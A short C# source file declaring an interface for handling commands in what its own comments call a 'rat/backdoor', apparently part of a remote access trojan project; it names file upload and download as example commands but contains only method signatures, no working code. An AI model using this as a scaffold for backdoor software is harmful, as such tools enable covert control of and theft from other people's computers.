namespace RAT.Interfaces
{
    /// <summary>
    /// Our rat/backdoor commands handling logic.
    /// </summary>
    public interface IRatCommandLogic
    {
        /// <summary>
        /// Handles rat command that clien wants to execute.
        /// </summary>
        /// <param name="command">Command to handle (such as file upload, download, etc)./param>
        void HandleRatCommand(string command);

        /// <summary>
        /// Wrapper for method located in interpreter, so it would be available on upper level.
        /// </summary>
        /// <param name="command">Potential rat command.</param>
        /// <returns>True if it is potential rat command, false otherwise.</returns>
        bool IsRatCommand(string command);
    }
}